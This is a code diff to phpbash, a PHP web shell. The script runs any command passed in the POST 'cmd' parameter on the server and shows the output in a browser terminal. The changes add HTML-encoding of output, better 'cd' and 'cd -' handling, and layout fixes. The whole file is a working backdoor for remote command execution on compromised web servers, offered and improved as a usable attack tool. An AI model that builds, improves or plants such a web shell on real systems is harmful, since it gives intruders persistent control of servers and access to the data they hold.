@@ -1,9 +1,22 @@
-<?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST['cmd'])) { echo shell_exec($_POST['cmd']." 2>&1"); die(); } ?>
+<?php
+/* phpbash by Alexander Reid (Arrexel) */
+if (ISSET($_POST['cmd'])) {
+    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
+    foreach ($output as $line) {
+        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
+    }
+    die(); 
+}
+?>
 
 <html>
     <head>
         <title></title>
         <style>
+            html, body {
+                max-width: 100%;
+            }
+        
             body {
                 width: 100%;
                 height: 100%;
@@ -40,35 +53,36 @@
                 right: 0;
                 line-height: 20px;
             }
-            
-            .input, .input form, .inputtext {
-                width: 100%;
-                height: 30px;
-                position: absolute;
-                bottom: 0px;
+                                 
+            form {
+                position: relative;
                 margin-bottom: 0px;
-                background: #000;
-                border: 0;
             }
-            
-            .input form, .inputtext {
-                width: 100%;
-                display: inline-block;
-            }
-            
+                     
             .username {
                 height: 30px;
                 width: auto;
                 padding-left: 5px;
-                display: inline-block;
                 line-height: 30px;
+                float: left;
             }
 
             .input {
                 border-top: 1px solid #333333;
+                width: 100%;
+                height: 30px;
+                position: absolute;
+                bottom: 0;
             }
-            
+
             .inputtext {
+                width: auto;
+                height: 30px;
+                bottom: 0px;
+                margin-bottom: 0px;
+                background: #000;
+                border: 0;
+                float: left;
                 padding-left: 8px;
                 color: #fff;
             }
@@ -93,9 +107,9 @@
     <body>
         <div class="console">
             <div class="output" id="output"></div>
-            <div class="input">
-                <div class="username" id="username"></div>
+            <div class="input" id="input">
                 <form id="form" method="GET" onSubmit="sendCommand()">
+                    <div class="username" id="username"></div>
                     <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                 </form>
             </div>
@@ -104,9 +118,12 @@
             var username = "";
             var hostname = "";
             var currentDir = "";
+            var previousDir = "";
+            var defaultDir = "";
             var commandHistory = [];
             var currentCommand = 0;
             var inputTextElement = document.getElementById('inputtext');
+            var inputElement = document.getElementById("input");
             var outputElement = document.getElementById("output");
             var usernameElement = document.getElementById("username");
             getShellInfo();
@@ -116,12 +133,13 @@
                 
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
-                        var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+                        var parsedResponse = request.responseText.split("<br>");
                         username = parsedResponse[0];
                         hostname = parsedResponse[1];
-                        currentDir =  parsedResponse[2];
-                        
+                        currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
+                        defaultDir = currentDir;
                         usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
+                        updateInputWidth();
                     }
                 };
 
@@ -141,11 +159,19 @@
                 switchCommand(commandHistory.length);
                 inputTextElement.value = "";
 
-                var parsedCommand = command.split(" ")[0];
-                if (parsedCommand == "cd") {
+                var parsedCommand = command.split(" ");
+                
+                if (parsedCommand[0] == "cd") {
                     cd = true;
-                    command = "cd "+currentDir+"; "+command+"; pwd";
-                } else if (parsedCommand == "clear") {
+                    if (parsedCommand.length == 1) {
+                        command = "cd "+defaultDir+"; pwd";
+                    } else if (parsedCommand[1] == "-") {
+                        command = "cd "+previousDir+"; pwd";
+                    } else {
+                        command = "cd "+currentDir+"; "+command+"; pwd";
+                    }
+                    
+                } else if (parsedCommand[0] == "clear") {
                     outputElement.innerHTML = "";
                     return false;
                 } else {
@@ -155,14 +181,16 @@
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         if (cd) {
-                            var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
-                            currentDir = parsedResponse[parsedResponse.length-2];
+                            var parsedResponse = request.responseText.split("<br>");
+                            previousDir = currentDir;
+                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                             usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
                         } else {
-                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                             outputElement.scrollTop = outputElement.scrollHeight;
                         } 
+                        updateInputWidth();
                     }
                 };
 
@@ -172,16 +200,18 @@
                 return false;
             }
             
+            function updateInputWidth() {
+                inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
+            }
+            
             document.onkeydown = checkForArrowKeys;
 
             function checkForArrowKeys(e) {
                 e = e || window.event;
 
                 if (e.keyCode == '38') {
-                    //up
                     previousCommand();
                 } else if (e.keyCode == '40') {
-                    //down
                     nextCommand();
                 }
             }
